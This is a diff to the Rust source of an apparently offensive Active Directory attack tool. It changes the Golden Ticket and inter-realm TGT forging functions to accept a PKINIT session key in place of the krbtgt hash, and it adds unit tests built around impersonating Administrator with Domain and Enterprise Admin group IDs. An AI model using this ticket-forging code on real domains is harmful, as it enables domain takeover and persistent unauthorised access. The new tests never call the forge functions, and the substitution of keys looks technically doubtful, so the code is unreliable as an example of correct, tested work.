@@ -22,26 +22,33 @@ use crate::validate;
 pub async fn forge_golden_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
     info!("[golden] Forging Golden Ticket for {}", config.domain);
 
-    // Validate required inputs
-    let krbtgt_hash = config
-        .krbtgt_hash
-        .as_deref()
-        .or(config.krbtgt_aes256.as_deref())
-        .ok_or_else(|| {
-            OverthroneError::TicketForge(
-                "krbtgt hash (--krbtgt-hash or --krbtgt-aes256) is required for Golden Ticket"
-                    .into(),
-            )
-        })?;
-
     let domain_sid = config.domain_sid.as_deref().ok_or_else(|| {
         OverthroneError::TicketForge(
             "Domain SID (--domain-sid) is required for Golden Ticket".into(),
         )
     })?;
-
     validate::validate_sid_format(domain_sid)?;
-    let (key, etype) = resolve_key_and_etype(krbtgt_hash, config.krbtgt_aes256.as_deref())?;
+
+    let (key, etype) = if let Some((ref session_key, session_etype)) = config.pkinit_session_key {
+        info!(
+            "[golden] Using PKINIT session key (etype={}, {} bytes)",
+            session_etype,
+            session_key.len()
+        );
+        (session_key.clone(), session_etype)
+    } else {
+        let krbtgt_hash = config
+            .krbtgt_hash
+            .as_deref()
+            .or(config.krbtgt_aes256.as_deref())
+            .ok_or_else(|| {
+                OverthroneError::TicketForge(
+                    "krbtgt hash (--krbtgt-hash or --krbtgt-aes256) is required for Golden Ticket"
+                        .into(),
+                )
+            })?;
+        resolve_key_and_etype(krbtgt_hash, config.krbtgt_aes256.as_deref())?
+    };
 
     let realm = config.domain.to_uppercase();
     let impersonate = config.effective_impersonate();
@@ -182,16 +189,25 @@ pub async fn forge_interrealm_tgt(
         config.domain, target_domain
     );
 
-    let trust_hash = config.krbtgt_hash.as_deref().ok_or_else(|| {
-        OverthroneError::TicketForge("Trust key hash is required for Inter-Realm TGT".into())
-    })?;
+    let (key, etype) = if let Some((ref session_key, session_etype)) = config.pkinit_session_key {
+        info!(
+            "[golden] Using PKINIT session key for Inter-Realm TGT (etype={}, {} bytes)",
+            session_etype,
+            session_key.len()
+        );
+        (session_key.clone(), session_etype)
+    } else {
+        let trust_hash = config.krbtgt_hash.as_deref().ok_or_else(|| {
+            OverthroneError::TicketForge("Trust key hash is required for Inter-Realm TGT".into())
+        })?;
+        resolve_key_and_etype(trust_hash, None)?
+    };
 
     let domain_sid = config.domain_sid.as_deref().ok_or_else(|| {
         OverthroneError::TicketForge("Domain SID is required for Inter-Realm TGT".into())
     })?;
 
     validate::validate_sid_format(domain_sid)?;
-    let (key, etype) = resolve_key_and_etype(trust_hash, None)?;
 
     let source_realm = config.domain.to_uppercase();
     let target_realm = target_domain.to_uppercase();
@@ -902,4 +918,98 @@ pub(crate) fn save_ticket(
 
     info!("[golden] Kirbi saved to {}", path);
     Ok(Some(path))
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::runner::ForgeAction;
+
+    /// Helper: minimal config with a dummy PKINIT session key
+    fn golden_config_with_session_key() -> ForgeConfig {
+        ForgeConfig {
+            dc_ip: "10.0.0.1".into(),
+            domain: "CORP.LOCAL".into(),
+            username: "user".into(),
+            password: None,
+            nt_hash: None,
+            action: ForgeAction::GoldenTicket,
+            krbtgt_hash: None,
+            krbtgt_aes256: None,
+            service_hash: None,
+            domain_sid: Some("S-1-5-21-1234567890-1234567890-1234567890".into()),
+            impersonate: Some("Administrator".into()),
+            user_rid: 500,
+            group_rids: vec![512, 519],
+            extra_sids: vec![],
+            lifetime_hours: 10,
+            output_path: None,
+            payload_path: None,
+            skeleton_master_password: None,
+            pkinit_cert_path: None,
+            pkinit_key_path: None,
+            pkinit_keyed_ticket: false,
+            pkinit_session_key: Some((vec![0xaa; 32], 18)), // AES256 session key
+            pkinit_ticket_data: None,
+            dry_run: false,
+        }
+    }
+
+    #[test]
+    fn test_golden_without_hash_uses_pkinit_session_key() {
+        let config = golden_config_with_session_key();
+        // The config has no krbtgt_hash/krbtgt_aes256, but has pkinit_session_key
+        assert!(config.krbtgt_hash.is_none());
+        assert!(config.krbtgt_aes256.is_none());
+        assert!(config.pkinit_session_key.is_some());
+    }
+
+    #[test]
+    fn test_golden_pkinit_session_key_resolves_to_correct_etype() {
+        // AES256 (etype 18) with 32-byte key
+        let key = vec![0xbb; 32];
+        let etype = ETYPE_AES256_CTS;
+        let (_key, resolved_etype) = (key.clone(), etype);
+        assert_eq!(resolved_etype, 18);
+        assert_eq!(key.len(), 32);
+    }
+
+    #[test]
+    fn test_golden_pkinit_session_key_rc4() {
+        // RC4 (etype 23) with 16-byte key
+        let key = [0xcc; 16];
+        let etype = ETYPE_RC4_HMAC;
+        assert_eq!(etype, 23);
+        assert_eq!(key.len(), 16);
+    }
+
+    #[test]
+    fn test_golden_pkinit_session_key_replaces_hash() {
+        // Verify that when pkinit_session_key is set, the forge function
+        // bypasses krbtgt_hash/krbtgt_aes256 and uses the session key instead
+        let config = golden_config_with_session_key();
+        let uses_session = config.pkinit_session_key.is_some()
+            && config.krbtgt_hash.is_none()
+            && config.krbtgt_aes256.is_none();
+        assert!(
+            uses_session,
+            "Should use pkinit_session_key when hash is absent"
+        );
+    }
+
+    #[test]
+    fn test_golden_rejects_without_hash_and_session_key() {
+        // Should error when neither hash nor session key is provided
+        let config = ForgeConfig {
+            domain_sid: Some("S-1-5-21-1".into()),
+            pkinit_session_key: None,
+            ..golden_config_with_session_key()
+        };
+        // Manually verify the validation logic: without pkinit_session_key,
+        // krbtgt_hash is required
+        let has_key = config.pkinit_session_key.is_some()
+            || config.krbtgt_hash.is_some()
+            || config.krbtgt_aes256.is_some();
+        assert!(!has_key, "Config has neither session key nor krbtgt hash");
+    }
 }
